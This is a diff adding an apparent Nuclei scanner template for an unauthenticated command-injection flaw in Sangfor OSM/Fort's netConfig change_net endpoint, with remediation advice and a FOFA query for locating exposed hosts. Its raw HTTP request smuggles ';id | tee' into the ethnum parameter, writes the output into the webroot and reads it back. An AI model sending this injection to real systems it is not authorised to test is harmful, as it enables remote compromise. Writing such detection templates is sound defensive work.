@@ -1,0 +1,67 @@
+id: sangfor-osm-change-net-rce
+
+info:
+  name: Sangfor OSM (Fort) netConfig change_net - Remote Command Execution (Command Injection)
+  author: qwtd
+  severity: critical
+  description: |
+    Sangfor Operations Security Management (OSM / Fort) is affected by a remote command injection vulnerability
+    in the netConfig change_net endpoint. By injecting shell metacharacters into request parameters (e.g., ethnum),
+    an unauthenticated attacker may execute arbitrary commands on the underlying system, potentially leading to
+    full compromise.
+  remediation: |
+    - Upgrade to a vendor-fixed version. Public reports indicate affected versions are below 3.0.12 (build 20241106).
+    - As a temporary mitigation, restrict access to the Fort/OSM management interface to trusted internal networks only
+      and block direct Internet exposure.
+    - Add WAF/Reverse-proxy rules to block requests to /fort/system;help/netConfig/change_net (and related netConfig endpoints)
+      and filter shell metacharacters in parameters.
+    - Review audit logs for suspicious requests and check webroot for unexpected files.
+  impact: |
+    Successful exploitation enables unauthenticated remote command execution, which can be used to deploy backdoors,
+    exfiltrate sensitive data, modify system configuration, or disrupt service availability.
+  reference:
+    - https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html
+    - https://cn-sec.com/archives/5076960.html
+  classification:
+    cwe-id: CWE-78
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  metadata:
+    vendor: sangfor
+    product: osm-fort
+    verified: false
+    max-request: 2
+    fofa-query: body="/fort/login" && header="FORTSESSIONID"
+  tags: SANGFOR-运维安全管理系统
+
+variables:
+  random: '{{rand_text_alpha(5)}}'
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /fort/system;help/netConfig/change_net HTTP/1.1
+        Host: {{Hostname}}
+        Sec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"
+        Accept-Language: zh-CN
+        Sec-Ch-Ua-Mobile: ?0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        sta=static&ipv=4&ethnum=;id | tee /usr/local/tomcat/webapps/fort/trust/version/{{random}}.txt;&address=1.1.1.1&netmask=2.2.2.2&gateWay=3.3.3.3
+
+      - |
+        GET /fort/trust/version/{{random}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
